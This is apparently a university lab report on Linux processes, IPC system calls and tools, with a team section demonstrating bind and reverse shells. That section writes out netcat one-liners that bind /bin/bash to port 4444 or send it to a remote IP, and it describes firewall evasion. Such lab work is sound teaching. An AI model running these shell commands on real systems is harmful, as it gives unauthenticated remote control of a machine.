# CSN. Lab 3. Technological Communication

# Done by Fedorov Alexey

---

# Task 1

```
1.a. Define the following briefly:
Process
Daemon
System call
Client & Server
Peer to Peer
1.b. List and briefly explain the different types of Unix system calls for IPC.
1.c. Explain for at least 2 kernel architectures, how IPC is handled.
```

## 1.a

### Process

**Process** - is a runtime environment for running an instance of a program. For example, there is some program and when it is launched, a process is created for it. This process is endowed with certain properties, a portion of RAM is allocated to it and a unique identifier is assigned.

Structure of process depends on operating system. Let's discuss linux procesess.

Process has several states:

- **R (running)** - The process is being processed by the processor.
- **R (runnable)** - The process is ready for processing and is in the queue to the processor. Running and runnable are denoted by the same letter R.
- **D (uninterruptible sleep)** When a process accesses a device, such as a disk or network card, it goes into this state. 
- **I (Idle)** - The state is similar to D, but such processes do not load the processor and are excluded from the calculation of the average system load (load average).
- **S (sleeping)** - The process is waiting for some resources that are currently unavailable.
- **T (stopped by job control signal)** - We'll talk about signals later, but the main thing to understand is that processes can process signals, and one of them can stop the process.
- **Z (zombie)** - When a process completes its work, it frees up its resources, but does not free up its PID in the process table.

![Figure 1](https://github.com/user-attachments/assets/e1db8b12-94c5-47c7-8851-745f9fc0c72f)

Every process starts with **fork()** system call that creates copy of process. Then the process configured via **exec()** system call.

![Figure 2](https://github.com/user-attachments/assets/c886b5c9-b998-4f3f-8448-3d38f74ada63)

Morover you can control processes with a several tools:

- **kill** - interrupts process. Have different signal to control process behavior.
- **bg**, **fg**, **jobs** - allow you to manage processes running in the foreground and background.
- **ps** - shows process list.

### Daemon

![Figure 3](https://github.com/user-attachments/assets/92c790bb-fb87-4940-9b0c-f2536a069c6f)


**Daemon** is a background process that runs long time. Usually it is service that controls something or server. Daemon examples are:

- **Nginx** - proxy engine for L7 routing. Runs as daemon is background and awaits requests.
- **Bluetoothd** - bluetooth daemon, controls bluetooth workflow.

Daemons usually have some provisor that controls their behavior. There are two popular provisor for linux:

- **Systemd** - actually it is linux initialization system, but it also provides functionality for services provision(systemd units).
- **Docker** - containerization system that used to run server applications. It used to run deamons. 

### System call

![Figure 4](https://github.com/user-attachments/assets/9b6dd4a0-f5e0-4b36-96bf-7a4d4284f001)


**System call** - is function that handles communication with operating system kernel. Every operating system has it's own system calls. There are libraries to use system calls in programming languages. Basically you can call them in asssembly code.

System calls example:
- **fork()**(linux) or **CreateProcess()**(windows) - Create a new process.
- **read()**(linux) or **ReadFile()**(windows) - Read data from a file or input device.

Assembly system call example:

![Figure 5](https://github.com/user-attachments/assets/cca69941-2748-4e99-b5ad-77736f80a521)

### Client-Server

![Figure 6](https://github.com/user-attachments/assets/ad38d9f1-2394-463d-a097-1e38ec7ad69b)

**Client-Server** - is a software architecture where 2 sides - Server and Client. Server usually contains business logic that implements service or application behavior. Client is interface for user to interact with server.  

Client-server examples:

**Any website** - browser is client side, interface to interact with server. Browser sends requests to server, server returns reponse to browser.

I Don't want write too much because this topic was discussed 100 times.

### Peer-to-Peer

![Figure 7](https://github.com/user-attachments/assets/e3f8cd24-f75f-44d6-a139-d7d254aed699)

**Peer-to-Peer** - is software architecture that describes distibuted network of eqully privileged peers. Peer is one computer, user. 

Examples of P2P:

- **BitTorrent** -  peer-to-peer network protocol for cooperative file sharing over the Internet.
- **MAC Addressing** - equal privileged networking addressing via device's MAC address.

## 1.b

Linux provides several mechanisms for Interprocess communication. Let's list then and look for specific system calls.

### Pipes

Pipe is a channel that connects two processes. One process can read, while other process writes data into pipe. For example, pipes are used to connect parent and child processes.

System calls:

- pipe() - creates a pipe and returns file descriptors for the read and write ends.


### Message Queues

Message queue is channel that provides asynchronous and typed information exchange. Every message has a type. Processes can send and receive messages based on type.

System calls:

- msgget() - creates or accesses a message queue.
- msgsnd() - sends a message to the queue.
- msgrcv() - receives a message from the queue.
- msgctl() - performs control operations on the message queue.

### Shared Memory

Shared memory provides access to memory segments to multiple processes. This is the fastest IPC method. To avoid race conditions, it provides semaphores.

System calls:

- shmget() - Allocates or accesses a shared memory segment.
- shmat() - Attaches the shared memory segment to the process’s address space.
- shmdt() - Detaches the shared memory segment from the process.
- shmctl() - Controls the shared memory segment, such as marking it for destruction.

### Semaphores

Semaphore is a tool to prevent race conditions. It controls amount of processes that can access to resource. Semophores are used in shared memory.

System calls:

- semget() - creates or accesses a set of semaphores.
- semop() - performs operations on a semaphore.
- semctl() - controls various aspects of the semaphore.

### Sockets

Sockets is method of communicating on different machines. It allows bidirectional communication and uses files to store data. 

System calls:

- socket() - creates a socket.
- bind() - binds the socket to an address/port.
- listen() - listens for connections on a socket.
- accept() - accepts incoming connections.
- connect() - connects to a remote socket.
- send() and recv() - send and receive data over the socket.


## 1.c

### Monolithic

Monolithic kernel archirecture is entire operating system. It includes all functionality in one program:

- Processes management
- Memory management
- IPC
- Devices drivers management

Interprorcess communication inside monolithic is efficient, but more complex, because everything happend inside kernel. 

Since all IPC inside the kernel, performance is very good. Switching between kernel space and user space are much faster than in other architectures. Data does not need to travel outside kernel space.

Mechanisms for IPC are the same as in answer 1.b, because Linux has Monolithic archirecture.

### Microkernel

Microkernel archirecture is not the same as microservice. It mean that kernel is very small and has only essential elements:

- Low-level memory management
- IPC
- Basic scheduling

Other functionality like device drivers, file systems and network protocols management located in user-space.

IPC for Microkernel is more critical that for Monolithic. Mojority of system-level services separated in user space.

Interprocess communication is slow, because there many context switches from user-space to kernel-space for services.

Mechanisms of IPC:

- Message Passing - processes or services send and receive messages via well-defined APIs.
- Minimal Shared Memory - some microkernels might offer shared memory mechanisms in limited cases, as example for performance-critical applications.
- Port-Based IPC - ports or message queues where processes communicate by sending messages to specific ports. Microkernel routes messages between processes and services.

# Task 2

```
2.a. Define the various methods for Inter Process communication and provide
advantages and disadvantages respectively.
2.b. What IPC facilities are currently on your system? Show the current activity in them.
2.c. Create two separate programs which implements inter process communication
(between parent process and child process) using shared memory and pipes, using any
programming language of your choice.
```

## 2.a

I defined methods of IPC above. Here is advantages and disadventages:

| **IPC Method**      | **Advantages**                                | **Disadvantages**                                |
|---------------------|-----------------------------------------------|-------------------------------------------------|
| **Pipes**           | Simple, safe for parent-child processes        | Unidirectional, limited buffer size             |
| **Message Queues**  | Asynchronous, prioritized messages             | Complexity, limited capacity                    |
| **Shared Memory**   | Fast, efficient for large data                 | Requires synchronization, security risks        |
| **Sockets**         | Bidirectional, networking               | Slower, more complex implementation             |
| **Semaphores**      | Prevents race conditions, simple synchronization | No data transfer, potential for deadlocks       |

## 2.b

To show IPC facilities and currect activity on my system, I will use several tools: `ipcs`,`lsof` and `ss`.

### ipcs

Let's execute without arguements:

![Figure 8](https://github.com/user-attachments/assets/8b69bde8-2648-4133-b931-9b27ebf16f2d)

We can see used Message Queues, Shared Memory Segments and Semaphores. There are no used MQs and Semaphores on Figure.

But SHM segments is used. Table shows us the following parameters:

- `shmid` - id of shared memory segment
- `owner` - owner of shm segment. Usually it is creator too
- `perms` - permisions for shared memory segment.
- `bytes` - size of memory segment.
- `nattch` - number of attached processes
- `status` - status of shm segment

I can also use flag `ipcs -c` to show actual creator and owner separately.

![Figure 9](https://github.com/user-attachments/assets/25c7f9ba-3490-47a1-837d-8be0ddb05140)

- `cuid, cgid` - creator user and group ids.
- `uid, gid` - owner user and group ids.

And finally I can get last operator and limits with flags `-p` and `-l`.

![Figure 10](https://github.com/user-attachments/assets/89355257-7aaa-4c4c-b413-45f7df8fd7ee)

- `lpid` - last operator process id.

### lsof

Unfortunately, ipcs can't show information about pipes. But `lsof` can. 

It is useless to run command without modifications, because it shows information about all file descriptors.

Let's run it with grep - `lsof 2>/dev/null | grep "pipe"`.

![Figure 11](https://github.com/user-attachments/assets/f5c8426f-d6c9-4346-9edc-984b48797bca)

We can see that pipes are used. But information is huge. Lets check what applications use pipes:

```
lsof 2>/dev/null | grep "pipe" | cut -d ' ' -f1 | sort | uniq -c
```

![Figure 12](https://github.com/user-attachments/assets/52d38971-df98-41d8-9b1f-34bf5a2bd2b6)

Here is big list of applications.

Let's discover socker usage with `lsof`:

```
lsof -i 2>/dev/null
```

![Figure 13](https://github.com/user-attachments/assets/27fb976c-bdb2-4171-a558-362aae9ef6c2)

Here is list of applications that using scoket. But it is not an entire list, because here is only socket that are used for network communication.

### ss

Socket can also be use for local IPC.

I will use `ss` to show them:

```
ss -w
```

![Figure 14](https://github.com/user-attachments/assets/82955851-3848-4fd6-8980-193b28215d46)

We can see list of used for local interprocess communication sockets.

## 2.c

- [Shared memory program](https://drive.google.com/file/d/1lVpIlOJTVXN7VbcZk-_U0G4KxXguFsW2/view?usp=sharing)
- [Pipe program](https://drive.google.com/file/d/12cfhHdZDgqDtW7oVrF1BT_RlVleKbpII/view?usp=sharing)

# Task 3

```
This task will be done in a team of 2.
3.a. Define the following:
bind shell [ use nc, & powershell to show a practical example with your teammate]
reverse shell [ use nc, ncat, socat, powershell & powercat to show a practical example
with your teammate]
3.b. List and give short explanations on the shell types in linux.
3.c. What is netcat’s gaping security hole? Recreate and explain it.
```
  
## 3.a

### Done in team with Joel Okore

Let's consider a few scenarios.

### Bind shell

**Bind shell** - is a kind of shell that waits for a connection from a remote machine by opening a listening network port on the target system. The target's command line becomes accessible to the remote machine upon successful connection to this port. In the case of bind shell, attacker’s machine acts as a client and the victim’s machine acts as a server, which opens a communication port and waits for the client (attacker) to connect to it, and then issues commands to be executed remotely on the victim’s machine. It is frequently employed in malicious scenarios or penetration testing when an attacker seeks to take over a system.

![Figure 15](https://github.com/user-attachments/assets/ab52926e-35d2-46b9-b85a-0e0488610b76)

In our first scenario, Joel reached out to Lesha for help and asked him to connect to his computer and execute some commands remotely. Joel has a public IP address and is directly connected to the internet. Lesha, however, is behind a NAT and has an internal IP address. Joel needs to bind bash to a TCP port on his public IP address and ask Lesha to connect to his specific IP address and port. Joel will run Netcat with the -e parameter to execute bash:

```sh
nc -nlvp 4444 -e /bin/bash
```

Now, Netcat has bound TCP port 4444 to bash and will redirect any input, output, or error messages from bash over the network. In other words, anyone connecting to TCP port 4444 on Joel’s machine (hopefully Lesha) will see Joel's command prompt. This is truly a "gaping security hole"!

```
nc -nv 192.168.0.178 4444
```

**Netcat** example:

![3a_bs_nc_attacker](https://github.com/user-attachments/assets/219bf95f-e1e8-4997-96fa-6b80655285a1)
![3a_bs_nc_target](https://github.com/user-attachments/assets/c72e2242-49d6-4d79-8ddc-bcb4844758aa)


**Socat** example:

![3a_bs_socat_attacker](https://github.com/user-attachments/assets/73045ebd-798b-4700-b096-951b5568273c)
![3a_bs_socat_target](https://github.com/user-attachments/assets/836b9faf-3e90-48e0-b3b6-8b90a9649e89)


**Powershell** example:

![3a_bs_powershell_attacker](https://github.com/user-attachments/assets/83537fb2-0230-4a4d-8d13-4e30284d175f)
![3a_bs_powershell_target](https://github.com/user-attachments/assets/6fb2e57e-bfe8-40c3-8eb2-1cffaa85fa03)


### Reverse shell

**Reverse shell** - the opposite of a bind shell. In a Reverse Shell scenario, the attacker gains control of the victim's system when the victim's computer establishes a connection with the attacker's computer. In situations when the victim's computer is protected by a firewall or network address translation (NAT), reverse shells are frequently utilized.

![Figure 16](https://github.com/user-attachments/assets/7ee3dc39-0d78-4d32-8542-4c74cc815828)

In our second scenario, Lesha needs Joel's help. Here, we can use another useful feature of Netcat — the ability to send commands to a host that is listening on a specific port. In this situation, Lesha cannot (as per the scenario) bind port 4444 for /bin/bash locally (bind shell) on his computer and wait for Joel to connect, but she can transfer control of his bash to Joel's computer. This is called a reverse shell. For this to work, Joel will first set up Netcat to listen. In our example, we'll use port 4444:

```
nc -nlvp 4444
```

Now, Lesha can send Joel a reverse shell from his Linux machine. Again, we use the `-e` option to make an application available remotely, which in this case is `/bin/bash`, the Linux shell:

```
nc -nv 192.168.0.178 4444 -e /bin/bash
```

**Netcal** example:

![3a_rs_ncat_attacker](https://github.com/user-attachments/assets/726aed85-8abe-4e29-a627-75bdd1b5237c)
![3a_rs_ncat_target](https://github.com/user-attachments/assets/4d95a82f-0d00-4535-a374-1ed9a4ede03f)


**Socat** example:
![3a_rs_socat_attacker](https://github.com/user-attachments/assets/a7ff0735-c6a7-4c95-9a68-f4f586709e5c)
![3a_rs_socat_target](https://github.com/user-attachments/assets/31ecc4f3-52c5-4eab-8716-8e35f55316c3)


**Powershell** example:

![3a_rs_powercat_attacker](https://github.com/user-attachments/assets/f8bb9223-b112-40a2-83a1-fbcd19e44d14)
![3a_rs_powercat_target](https://github.com/user-attachments/assets/106a20eb-64e0-4df1-ad95-9631b7f9ead2)

**Powercat** example:

![3a_rs_powercat_attacker](https://github.com/user-attachments/assets/9c6fc7d7-97da-4a8c-9595-203468b392f8)
![3a_rs_powercat_target](https://github.com/user-attachments/assets/a3e808aa-48e7-42e0-b04e-7e2b624cb441)


## 3.b

Shell in linux is terminal commands interpreter. The following shells are most popular for nowadays:

Here's a compact comparison of **Bash**, **sh**, **fish**, **zsh**, and **csh**:

| **Shell**  | **Description**                         | **Key Features**                                                             | **Use Cases**                                  |
|------------|-----------------------------------------|------------------------------------------------------------------------------|------------------------------------------------|
| **Bash**   | Default Linux shell, POSIX-compliant    | Command history, scripting, job control, programmable completion              | Standard shell scripting, interactive use      |
| **sh**     | Original Unix shell (Bourne Shell)      | Lightweight, minimal scripting, POSIX-compliant, no advanced features         | Basic shell scripting, legacy systems          |
| **fish**   | User-friendly, modern shell             | Autosuggestions, syntax highlighting, simple configuration                    | Interactive shell for beginners and developers |
| **zsh**    | Feature-rich, highly customizable       | Plugin support (Oh My Zsh), auto-completion, themes, improved scripting       | Power users, custom workflows                  |
| **csh**    | C-like syntax, historical Unix shell    | Aliases, job control, limited scripting compared to Bash                      | Older Unix systems, specific legacy workflows  |

## 3.c

The ability of Netcat to function as a backdoor by enabling an easily exploitable listening service is referred to as the Netcat's "gaping security hole". Netcat has the potential to provide remote users with unauthorized access to a system if it is overused or configured incorrectly. Using the -e option while running Netcat increases the danger significantly because it creates a backdoor by binding a shell to a network port directly. The majority of modern Linux/BSD systems do not have this feature, but since Kali Linux is a penetration testing distribution, the Netcat version that comes with Kali supports the -e option.

### Recreating the Netcat Gaping Security Hole:

On the victim machine, we ran the following command to bind a shell to port 7777 using Netcat:

![3a_bs_nc_target](https://github.com/user-attachments/assets/df5b09cc-e919-48c9-9a56-1554c78cc2a4)

-l: Listen for incoming connections.
-v: Verbose mode, to provide feedback.
-p 7777: Bind to port 4444.
-e /bin/bash: Execute /bin/bash when someone connects to the port, giving direct shell access.

On the attacker’s machine, we made use of Netcat to connect to the victim machine’s IP address and port 7777:

![3a_bs_nc_attacker](https://github.com/user-attachments/assets/8c0a4e82-bdc0-435b-b3d4-88fc084ace59)

Here are some of the security issues that comes up when the netcat's gaping security hole is exploited:
1. Remote Shell Access: When a shell is bound to a port using the -e flag in Netcat, anyone connecting is given complete command access. This can be fatal if the shell runs with elevated privileges (root, for example).
2. Lack of Authentication: Netcat lacks encryption and authentication. Anyone who discovers the open port and is connected to the internet can access the shell without a login.
3. Firewall Evasion: By using frequently approved ports (like 80 and 443), Netcat can be used to bypass firewall limitations and grant attackers access to services that are authorized.

## References

1. https://sysadminium.ru/processes-in-a-linux-system/
2. https://en.wikipedia.org/wiki/Daemon_(computing)
3. https://en.wikipedia.org/wiki/System_call
4. https://brave.com/glossary/peer-to-peer/#:~:text=A%20peer%2Dto%2Dpeer%20(,%2C%20processing%20capabilities%2C%20and%20bandwidth.
5. https://www.geeksforgeeks.org/inter-process-communication-ipc/
6. https://www.man7.org/linux/man-pages/man1/ipcs.1.html
7. https://man7.org/linux/man-pages/man8/lsof.8.html
8. https://medium.com/@gpiechnik/what-is-bind-shell-and-reverse-shell-4653363ebd87
